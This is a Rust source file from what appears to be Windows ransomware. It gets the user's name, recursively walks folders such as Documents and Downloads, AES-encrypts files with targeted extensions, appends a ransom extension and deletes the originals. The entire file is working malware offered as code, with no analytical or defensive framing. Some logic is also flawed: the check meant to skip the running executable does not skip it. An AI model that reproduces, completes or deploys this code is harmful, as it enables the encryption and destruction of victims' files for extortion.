// walker.rs

extern crate winapi;

use crate::cypher::cypher::encrypt;
use std::ffi::CString;
use std::path::PathBuf;
use std::ptr::null_mut;
use std::{env, str};

use winapi::shared::minwindef::FILETIME;
use winapi::um::fileapi::{DeleteFileA, FindFirstFileA, FindNextFileA};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::minwinbase::WIN32_FIND_DATAA;
use winapi::um::winbase::GetUserNameA;
use winapi::um::winnt::{FILE_ATTRIBUTE_DIRECTORY, HANDLE};

/// Stores the paths of encrypted files.
pub struct FileTree {
    pub files: Vec<String>,
}

/// Retrieves the current user's name from the system.
///
/// # Returns
/// * `Ok(String)` with the user name, or
/// * `Err(std::io::Error)` if the operation fails.
pub fn get_user_name() -> Result<String, std::io::Error> {
    let mut size: u32 = 0;
    let mut buffer: Vec<i8> = Vec::new();

    unsafe {
        // First call determines the required buffer size.
        GetUserNameA(null_mut(), &mut size);

        buffer.resize(size as usize, 0i8);

        // Second call populates the buffer with the user name.
        if GetUserNameA(buffer.as_mut_ptr(), &mut size) == 0 {
            return Err(std::io::Error::last_os_error());
        }
        // Resize the buffer to remove the null terminator.
        buffer.resize((size - 1) as usize, 0);
    }

    // Convert i8 buffer to a UTF-8 string.
    Ok(String::from_utf8_lossy(&buffer.iter().map(|&c| c as u8).collect::<Vec<u8>>()).to_string())
}

/// Traverses the specified directories, encrypts matching files, and returns a FileTree
/// containing the paths of encrypted files.
///
/// # Arguments
/// * `user_name`        - The system user name used to form the path.
/// * `dir_names`        - List of directory names to explore (e.g., "Documents", "Downloads").
/// * `ransom_ext`       - Extension appended to encrypted files.
/// * `valid_extensions` - Allowed file extensions that can be encrypted.
/// * `aes_key`          - AES key used for encryption.
pub fn walk_and_encrypt_directories(
    user_name: String,
    dir_names: &[&str],
    ransom_ext: &str,
    valid_extensions: &[&str],
    aes_key: &[u8],
) -> FileTree {
    let mut file_tree = Vec::new();

    for dir in dir_names.iter() {
        let full_path = format!("C:\\Users\\{}\\{}", user_name, dir);
        #[cfg(debug_assertions)]
        println!("Exploring: {}", full_path);

        encrypt_directory_contents(
            &full_path,
            ransom_ext,
            valid_extensions,
            aes_key,
            &mut file_tree,
        );
    }

    FileTree { files: file_tree }
}

/// Explores the contents of a directory and updates the file tree with encrypted files.
///
/// # Arguments
/// * `dir_path`         - The path to the directory to be explored.
/// * `ransom_ext`       - Extension appended to encrypted files.
/// * `valid_extensions` - Allowed file extensions that can be encrypted.
/// * `aes_key`          - AES key used for encryption.
/// * `file_tree`        - Reference to a vector holding the paths of encrypted files.
fn encrypt_directory_contents(
    dir_path: &str,
    ransom_ext: &str,
    valid_extensions: &[&str],
    aes_key: &[u8],
    file_tree: &mut Vec<String>,
) {
    // Appends "\*" to search all files and subdirectories within dir_path.
    let full_path = CString::new(format!("{}\\*", dir_path)).unwrap();
    let _ = traverse_and_encrypt(full_path, ransom_ext, valid_extensions, aes_key, file_tree);
}

/// Recursively traverses the directory and encrypts files with allowed extensions.
/// If encryption succeeds, the destination file path is added to the file tree.
///
/// # Arguments
/// * `dir_name`         - Directory name as a CString.
/// * `ransom_ext`       - Extension appended to encrypted files.
/// * `valid_extensions` - Allowed file extensions that can be encrypted.
/// * `aes_key`          - AES key used for encryption.
/// * `file_tree`        - Reference to a vector holding the paths of encrypted files.
fn traverse_and_encrypt(
    dir_name: CString,
    ransom_ext: &str,
    valid_extensions: &[&str],
    aes_key: &[u8],
    file_tree: &mut Vec<String>,
) -> Result<(), std::io::Error> {
    unsafe {
        let mut file_data: WIN32_FIND_DATAA = WIN32_FIND_DATAA {
            dwFileAttributes: 0,
            ftCreationTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            ftLastAccessTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            ftLastWriteTime: FILETIME {
                dwLowDateTime: 0,
                dwHighDateTime: 0,
            },
            nFileSizeHigh: 0,
            nFileSizeLow: 0,
            dwReserved0: 0,
            dwReserved1: 0,
            cFileName: [0i8; 260],
            cAlternateFileName: [0i8; 14],
        };

        let h_find: HANDLE = FindFirstFileA(dir_name.as_ptr(), &mut file_data);
        if h_find == INVALID_HANDLE_VALUE {
            return Ok(());
        }

        loop {
            let mut name_buffer: Vec<u8> = Vec::new();
            for byte in file_data.cFileName.iter() {
                if *byte == 0 {
                    break;
                }
                name_buffer.push(*byte as u8);
            }

            // If it's not a directory, process the file.
            if file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0 {
                let curr = dir_name.as_bytes();
                let new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                let file_path = PathBuf::from(String::from_utf8_lossy(&new_dir).to_string());

                // Skip encrypting the running executable.
                if file_path.exists() {
                    let current_exe_path = env::current_exe().expect("Unable to get the exe path");
                    if current_exe_path.canonicalize().unwrap() == file_path.canonicalize().unwrap()
                    {
                        #[cfg(debug_assertions)]
                        println!("Skipping the current executable");
                    }
                }

                // Extract file extension based on the last dot.
                let dot_position = match new_dir.iter().rposition(|&x| x == b'.') {
                    Some(pos) => pos,
                    None => {
                        #[cfg(debug_assertions)]
                        eprintln!("Error: No '.' found in the file name");
                        return Ok(());
                    }
                };
                let extension = &new_dir[dot_position..];

                // Check if the extension is in the list of valid extensions.
                let is_valid = valid_extensions
                    .iter()
                    .any(|&ext| CString::new(ext).unwrap() == CString::new(extension).unwrap());
                if is_valid {
                    let source_file_name = new_dir.clone();
                    let mut dest_file_name = source_file_name.clone();
                    dest_file_name.extend_from_slice(format!(".{}", ransom_ext).as_bytes());

                    let encrypt_result = encrypt(
                        CString::new(&source_file_name[..]).unwrap(),
                        CString::new(&dest_file_name[..]).unwrap(),
                        aes_key.to_vec(),
                    );

                    #[cfg(debug_assertions)]
                    let source_file_str = String::from_utf8(source_file_name)
                        .unwrap_or_else(|_| "Invalid UTF-8".to_string());
                    let dest_file_str = String::from_utf8(dest_file_name)
                        .unwrap_or_else(|_| "Invalid UTF-8".to_string());
                    
                    #[cfg(debug_assertions)]
                    println!("{} -> {}", source_file_str, dest_file_str);
                    
                    if encrypt_result {
                        // Add the path of the encrypted file to the file tree.
                        file_tree.push(dest_file_str.clone());
                        // Delete the original file after successful encryption.
                        let _delete_result = DeleteFileA(
                            CString::new([&curr[..curr.len() - 1], &name_buffer[..]].concat())
                                .unwrap()
                                .as_ptr(),
                        );
                    }
                }
            } else {
                // Handle directories, excluding "." and "..".
                let name_string = String::from_utf8(name_buffer.clone()).expect("Invalid UTF-8");
                if name_string != "." && name_string != ".." {
                    let curr = dir_name.to_bytes_with_nul();
                    let mut new_dir = [&curr[..curr.len() - 1], &name_buffer[..]].concat();
                    new_dir.push(b'\\');
                    new_dir.extend_from_slice(b"*");
                    let _ = traverse_and_encrypt(
                        CString::new(new_dir).unwrap(),
                        ransom_ext,
                        valid_extensions,
                        aes_key,
                        file_tree,
                    );
                }
            }

            // Move on to the next file or break if there are no more.
            if FindNextFileA(h_find, &mut file_data) == 0 {
                break;
            }
        }
        CloseHandle(h_find);
    }
    Ok(())
}
